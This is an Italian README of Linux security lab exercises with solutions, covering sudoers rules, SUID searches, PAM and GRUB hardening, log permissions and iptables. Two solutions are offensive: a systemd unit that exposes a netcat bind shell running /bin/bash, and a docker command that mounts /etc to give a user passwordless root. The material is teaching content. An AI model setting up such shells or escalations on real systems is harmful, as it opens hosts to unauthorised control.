# useful-links-cysec
- [here document](https://thelinuxcode.com/what-is-cat-eof-bash-script/)
- [regex cheatsheet](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions/Cheatsheet)
- [sed guide](https://www.gnu.org/software/sed/manual/sed.html)
----
- Configura sudo affinchè un utente possa eseguire solo un comando specifico (e.s: nmap)
  - ```bash
    #/etc/sudoers.d/buonhobo

    buonhobo ALL = /usr/bin/nmap
    ```
  - [sudoers guide](https://www.digitalocean.com/community/tutorials/how-to-edit-the-sudoers-file)
- Configura sudo affinchè un utente possa eseguire solo un comando specifico ma senza un parametro (e.s: si puo eseguire nmap ma non nmap -p). Nota: si possono mettere espressioni regolari nel file sudoers
  - ```bash
    #/etc/sudoers.d/buonhobo

    buonhobo ALL = /usr/bin/nmap, !/usr/bin/nmap -p
    ```
  - [sudoers regex](https://www.sudo.ws/posts/2022/03/sudo-1.9.10-using-regular-expressions-in-the-sudoers-file/)
- Cercare tutti gli eseguibili con SUID
  - ```bash
    find / -perm -4000 -type f -ls
    ```
  - ```bash
    find / -perm -u=s -type f -ls
    ```
  - [find cheatsheet](https://cheat.sh/find)
- Cercare tutti gli eseguibili con GUID
  - ```bash
    find / -perm -2000 -type f -ls
    ```
  - ```bash
    find / -perm -g=s -type f -ls
    ```
- Creare uno unit file di Systemd per permettere una shell aperta a tutti sulla rete (netcat in modalità listen con il processo /bin/bash) e provare a connettersi dalla propria macchina usando netcat
  - ```bash
    #/etc/systemd/system/netcat.service

    [Unit]
    Description=Netcat shell

    [Service]
    # connect using `nc localhost 1234`
    ExecStart=/bin/nc -l -p 1234 -e /bin/bash

    [Install]
    WantedBy=default.target
    ```
  - [systemd arch wiki](https://wiki.archlinux.org/title/Systemd#Writing_unit_files)
  - [systemd manual](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html)
- Installare e configurare un modulo PAM per richiedere caratteristiche minime alla password (min 8 caratteri, maiuscole, minuscole e simboli)
  - ```bash
    #/etc/pam.d/common-password <- per forza qui, il file esiste già e va modificato con sed

    #...
    password requisite pam_pwquality.so retry=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1
    #...
    ```
  - [pam guide](https://www.tecmint.com/configure-pam-in-centos-ubuntu-linux/)
  - [cracklib guide](https://linux.die.net/man/8/pam_cracklib)
- Imposta una password a GRUB così da non permettere l'avvio del sistema operativo con parametri del kernel non standard
  - ```bash
    # This sets a superuser root with password ciao
    password=ciao
    hash=$(echo -e "$password\n$password" | grub-mkpasswd-pbkdf2 | awk '/grub/ {print $NF}')
    cat << EOF >> /etc/grub.d/40_custom

    set superusers='root'
    password_pbkdf2 root $hash
    EOF

    # This makes the boot entry unrestricted
    # So that the password is only needed for changing it
    # And not for booting the system
    sed -i '0,/^CLASS="/ {//s/"$/ --unrestricted"/}' /etc/grub.d/10_linux

    # This applies the changes
    sudo update-grub
    ```
    - [stack overflow question](https://superuser.com/questions/488275/grub-2-password-protection-in-debian)
- Rendi la cartella /var/log leggibile solo da root
  - ```bash
    # I permessi diventano rwx--x--x
    # Questo permette agli altri di accedere ai file dentro /var/log se hanno il permesso
    # Ma non permette di vedere i file dentro /var/log
    chmod 711 /var/log
    # Si può mettere 700 per dare permesso solo a root
    # E si può usare -R per modificare ricorsivamente i permessi
    ```
- Configura un utente per poter fare cat dei logs ma non essere amministratore (va configurato sudoers in modo opportuno)
  - ```bash
    #/etc/sudoers.d/buonhobo

    # This allows running cat inside /var/log but does not allow using .. to access other directories
    buonhobo ALL = /usr/bin/cat ^/var/log/.+$, !/usr/bin/cat ^/var/log/.*(\.\.).*$
    ```
- Trova tutti i processi che hanno un file descriptor aperto dentro la cartella /var/log (il comando lsof tornerà comodo)
  - ```bash
    lsof +D /var/log
    ```
- Usa docker per effettuare un privilege escalation
  - ```bash
    # This adds buonhobo to sudo group
    docker run -v /etc:/ciao alpine sh -c "sed '/sudo/s/[a-z,]*$/buonhobo/' -i /ciao/group"

    # This lets buonhobo use sudo for everything with no password
    docker run -v /etc:/ciao alpine sh -c "echo 'buonhobo ALL=(ALL) NOPASSWD: ALL' >> /ciao/sudoers"
    ```
- Cercare se esiste un qualche file all'interno della home di un utente che sia scrivibile da tutti gli utenti
  - ```bash
    find /home/ -type f -perm -o=w
    ```
- Cercare se esiste una cartella all'interno della home di un utente che sia scrivibile da tutti gli utenti
  - ```bash
    find /home/ -type d -perm -o=w
    ```
- Creare un utente con la password che scade ogni giorno
  - ```bash
    # This creates a user with a password that expires every day
    sudo useradd -m buonhobo
    chage -M 1 buonhobo
    ```
  - [chage cheatsheet](https://cheat.sh/chage)
  - [/etc/shadow manual](https://linux.die.net/man/5/shadow)
----
Per tutta la roba iptables basta consultare il [manuale](https://linux.die.net/man/8/iptables) e la [guida di DigitalOcean](https://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands).
Meglio ricordarsi quando si è in ssh di permettere le connessioni ESTABLISHED e RELATED per non venire disconnessi.
Altra cosa buona è permettere il traffico in loopback

- Imposta Iptables affinchè sia permesso l'accesso alla macchina solo via SSH (TCP port 22)
- Imposta Iptables affinchè sia permesso l'accesso alla macchina solo via SSH (TCP port 22) dall'IP 1.2.3.4 e ad un webserver da qualunque IP (TCP port 80 e 443)
- Imposta Iptables affinchè sia bloccato tutto il traffico Internet sulla macchina (gli utenti non possono navigare) ma sia funzionante il webserver (TCP port 80 e 443)
- Imposta Iptables affinchè sia permesso l'accesso alla macchina solo via SSH (TCP port 22) e ad un webserver (TCP port 80 e 443)
